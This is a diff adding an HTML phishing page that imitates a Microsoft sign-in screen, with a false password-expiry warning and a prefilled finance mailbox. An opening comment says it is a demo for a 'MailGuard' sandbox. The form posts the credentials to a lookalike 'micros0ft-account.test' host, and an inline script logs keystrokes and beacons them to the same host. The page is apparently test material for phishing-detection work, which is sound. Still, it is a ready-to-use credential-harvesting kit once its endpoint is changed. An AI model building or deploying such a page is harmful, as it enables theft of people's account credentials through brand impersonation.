@@ -1,0 +1,31 @@
+<!doctype html>
+<!-- DEMO PHISHING PAGE. Served only inside the MailGuard sandbox network. -->
+<html><head><meta charset="utf-8"><title>Sign in to your account</title>
+<style>
+ body{margin:0;font-family:"Segoe UI",Arial,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;height:100vh}
+ .box{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+ .logo{display:flex;gap:4px;align-items:center;margin-bottom:16px;font-size:20px;color:#5e5e5e}
+ .sq{display:grid;grid-template-columns:10px 10px;gap:2px}.sq i{width:10px;height:10px;display:block}
+ h1{font-size:24px;font-weight:600;margin:0 0 16px}
+ input{width:100%;border:0;border-bottom:1px solid #666;padding:8px 0;font-size:15px;margin-bottom:16px;outline:0}
+ button{background:#0067b8;color:#fff;border:0;padding:8px 32px;font-size:15px;float:right}
+ .small{font-size:13px;color:#0067b8;margin:8px 0 24px}
+ .warn{background:#fde7e9;color:#a4262c;padding:8px;font-size:13px;margin-bottom:16px}
+</style></head>
+<body><div class="box">
+ <div class="logo"><span class="sq"><i style="background:#f25022"></i><i style="background:#7fba00"></i><i style="background:#00a4ef"></i><i style="background:#ffb900"></i></span> Microsoft</div>
+ <div class="warn">Your password expires today. Sign in to keep your mailbox.</div>
+ <h1>Sign in</h1>
+ <form action="http://collect.micros0ft-account.test/harvest" method="post">
+  <input type="email" name="login" placeholder="Email, phone, or Skype" value="finance@contoso.com">
+  <input type="password" name="passwd" placeholder="Password">
+  <div class="small">Forgot my password</div>
+  <button type="submit">Sign in</button>
+ </form>
+ <div style="clear:both"></div>
+</div>
+<script>
+ // capture keystrokes and beacon them out (classic credential-phish behaviour)
+ var k=[];document.addEventListener('keydown',function(e){k.push(e.key);if(k.length>8){navigator.sendBeacon('http://collect.micros0ft-account.test/harvest',k.join(''));k=[];}});
+</script>
+</body></html>
